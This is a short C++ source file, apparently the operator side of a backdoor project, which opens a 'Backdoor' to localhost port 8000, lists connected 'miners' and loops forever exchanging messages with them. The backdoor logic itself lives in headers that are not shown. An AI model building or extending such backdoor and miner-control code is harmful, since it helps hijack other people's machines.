#include <iostream>
#include "communication.h"
#include "backdoor.h"
#define IP "127.0.0.1"
#define PORT 8000




int main(int argc, char *argv[]){
    char * s = "Hello world";
    Backdoor b(IP, PORT, true);

    std::vector<Backdoor> conexoes;
    conexoes.push_back(b);
    int i = 0, choice;

    std::cout << "Choose Miner: " << std::endl;
    for (Backdoor back : conexoes){

        std::cout << i << " - " << b.get_miner_id() << " - ";
        std::cout << b.get_miner_ip() << std::endl;
        choice = std::cin.get();
    }


    Communication c(IP, PORT);
    bool isalive = true;

    while(true){
        c.listen_forever();
        std::cout << "Connected" << std::endl;

        while(isalive){
            isalive = 1;
            c.send_message(s);
            c.recv_message();
        }
    }

}